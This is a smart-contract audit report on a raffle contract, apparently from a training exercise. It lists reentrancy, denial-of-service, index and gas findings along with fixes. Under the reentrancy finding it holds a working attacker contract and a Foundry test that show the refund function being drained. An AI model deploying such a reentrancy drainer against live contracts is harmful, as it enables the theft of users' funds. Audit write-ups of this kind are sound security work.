### [H-1] Reentracy attack  in `PuppyRaffle::refund` allows entrant to drain contract raffle balance

**Description:** The `PuppyRaffle::refund` function does not follow CEI [Checks, Effects, Interactions] and as a result, enables particpant to drain the contracts balance.

In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address and only after making  that eternal call do we updated the `PuppyRaffle::players` array.

```javascript

 
    function refund(uint256 playerIndex) public {
        //@audit MEV
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

  @>      payable(msg.sender).sendValue(entranceFee);

    @>    players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }

```
A player who has entered the raffle could have a `fallback`/`receive` function that call s the `PuppyRaffle:refund` function again and claim another refund. They could contiue the cycle till the contract balance is empty.


**Impact:** All fees paid by entrants could be stolen by the malicious participant.

**Proof of Concept:**

1. User  enter the raffle
2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`
3. Attacker enters the raffle
4. Attacker calls the `PuppyRaffle::refund` from their attack contract, draining the contrach balance.


**Proof of Code **
<details>
<summary>Code</summary>
Place the following test into `PuppyRaffle.t.sol`:


```javascript
   function test_Reentrancy() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
        address attackUser = makeAddr("atackUser");
        vm.deal(attackUser, 1 ether);

        uint256 startingAttackerContractBalance = address(attackerContract).balance;
        uint256 startPuppyBalance = address(puppyRaffle).balance;

        //attack

        vm.prank(attackUser);
        attackerContract.attack{value: entranceFee}();

        console.log("starting attacker contract ballance", startingAttackerContractBalance);
        console.log("starting puppy contract ballance", startPuppyBalance);

        console.log("ending attacker contract balance", address(attackerContract).balance);
        console.log("ending puppy contract balance", address(puppyRaffle).balance);
    }
```
 And this contract as well

 ```javascript


contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    uint256 attackerindex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = _puppyRaffle.entranceFee();
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerindex);
        }
    }

    receive() external payable {
        _stealMoney();
    }

    fallback() external payable {
        _stealMoney();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerindex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerindex);
    }
}


 ```
 </details>



**Recommended Mitigation:**  To prevent this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. Additionally, we should move the event emission up as well.

```diff

    function refund(uint256 playerIndex) public {
        //@audit MEV
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+      players[playerIndex] = address(0);
+      emit RaffleRefunded(playerAddress);

      payable(msg.sender).sendValue(entranceFee);

-    players[playerIndex] = address(0);
-  emit RaffleRefunded(playerAddress);
    }

```

### [M-#] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential denial of service (DoS) attack, increamenting gas cost for feature entrans.

//this accuallly create a issue in front runing: check about that


**Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for  duplicates. However, the longer the `PuppyRaffle::Players` array is, the more checks a new player will have to make. This means the gas costs for players who enter right when  the raffle start will be dramatically lower than those who enter later. Every additional address in the `players` array, is an additional check the loop have to make.



```javascript 

  // @audit  DoS attack
  @>      for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }

```



**Impact:**  The gas cost for raffle entrants will greatly increase as more players enter the raffle. Discouraging later users from entering, and causing a rush at the start of the raffle to be one of the first entrant in the  queue.

An attacker might make the `PuppyRaffle::entrants` array so big, that no one else enter, guranteing themselfs to win


**Proof of Concept:**
If we have 2 sets of 100 players enter, the gas cost will be as such:
- 1st 100 playes: ~ 6544754 gas
- 2nd 100 playes: ~ 18938144 gas

This is more than 3x more expensive for the second players


<details>
<summary>PoC</summary>
Place the following test into `PuppyRaffle.t.sol`:


```javascript
  function test_DenaialOfService_enterRaffle() public {
     //here
    address[] memory players = new address[](100);

    uint160 playersNum = 100;

//pushing 1000 players to my list first;

 for (uint160 i = 0; i < playersNum; i++) {
 
 players[i] = address(i);
 
 }


uint256 firstGasleftBefore = gasleft();
      puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);

      uint256 firstGasLeftAfter = gasleft();

      uint256 firstGasUsed = firstGasleftBefore -  firstGasLeftAfter;

     console.log(firstGasUsed,":firstGasUsed"); 







    address[] memory players2 = new address[](100);


//pushing 1000 players to my list first;

 for (uint160 i = 0; i < playersNum; i++) {
 
 players2[i] = address(i + playersNum);
 
 }


uint256 secondGasleftBefore = gasleft();
      puppyRaffle.enterRaffle{value: entranceFee * players2.length}(players2);

      uint256 secondGasLeftAfter = gasleft();

      uint256 secondGasUsed = secondGasleftBefore -  secondGasLeftAfter;

     console.log(secondGasUsed,":secondGasUsed"); 



assert(firstGasUsed < secondGasUsed);




    }
```

</details>





**Recommended Mitigation:**  



# Low


### [L-1] `PuppyRaffle::getActivePlayerIndex` returns 0 forn non-exitant players and for players at index 0,causing a player at index 0 to incorrectly  think they have not entered the raffle.


**Description:**  if a player is in the `PuppyRaffle::players` array at 0 this will return 0, but accoring to the natspec it will also return 0 if the player is not in the array.


```javascript
    /// @return the index of the player in the array, if they are not active, it returns 0

 function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
            //q what if the player is at index 0
            //@audit if the player is at index 0, return 0, and the palyer might think they are not in the raffle
        }
        return 0;
    }

```

**Impact:** A player at index 0 may incorrectly  think they have not entered the raffle, and attempt to enter again, wasting gas.

**Proof of Concept:**
1. User enter raffle, they are the first entrant
2. `PuppyRaffle::getActivePayerIndex` retuns 0
3. User thinks they have not enterd correctly due to the unction documentation

**Recommended Mitigation:**  The easiest recommendation would be to revert if a player is not in the array instead of returning 0.

 You could also reserve the 0th position for any competition , but the better solution might be to return an `int256` where the function returns -1 if the player is not active





# Gas
### [G-1] Unchanged state variable should be declared constant or immutable

Reading from storage is much more expensive than reading from a constant or immutable variable.

instances
- `PuppyRaffle::raffleDauration` should be `immutable`
- `PuppyRaffle::commonImageUri` should be `constant`
- `PuppyRaffle::rareImageUri` should be `constant`
- `PuppyRaffle::legendaryImageUri` should be `constant`


### [G-2] storage varaible in a loop should be cached

Everytime you called  `players.length` you read from storage, as suppose to memory which is more gas efficient.

```diff
+ uint256 playersLength = players.length;

-  for (uint256 i = 0; i < players.length - 1; i++) {
+  for (uint256 i = 0; i < playersLength - 1; i++) {
  
-            for (uint256 j = i + 1; j < players.length; j++) {
+            for (uint256 j = i + 1; j < playersLength; j++) {

                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }

        }
```


### [I-1] `PuppyRaffle::selectWinner` does not follow CEI [Checks, Effects, Interactions] which is not best practice

its best to keep code clean and follow CEI [Checks, Effects, Interactions]

```diff
- (bool success,) = winner.call{value: prizePool}("");
-        require(success, "PuppyRaffle: Failed to send prize pool to winner");
        _safeMint(winner, tokenId);
+       (bool success,) = winner.call{value: prizePool}("");
+       require(success, "PuppyRaffle: Failed to send prize pool to winner");
```






